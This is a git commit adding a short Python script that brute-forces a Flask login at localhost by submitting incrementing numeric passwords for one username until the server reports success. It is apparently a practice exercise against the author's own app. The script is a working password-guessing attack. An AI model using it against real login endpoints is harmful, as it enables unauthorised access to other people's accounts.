3c85ade742304425bdc67b116c6dce5fd018cf0e
Deepak Paudel <>
2019-03-01 21:18:30 +0545

    simple brute attack for login and dictionary attack for flask login

---
+++ BruteForce/brute.py
@@ -0,0 +1,14 @@
+import json
+from requests import post as POST
+
+URL = 'http://127.0.0.1:5000/login'
+
+if __name__ == '__main__':
+	success = False
+	guess_password = 0
+	while not success:
+		response = POST(URL, data={'username': 'Deepak', 'password': str(guess_password)})
+		success = json.loads(response.text).get('success')
+		if success:
+			print(f'Password is {guess_password}')
+		guess_password += 1
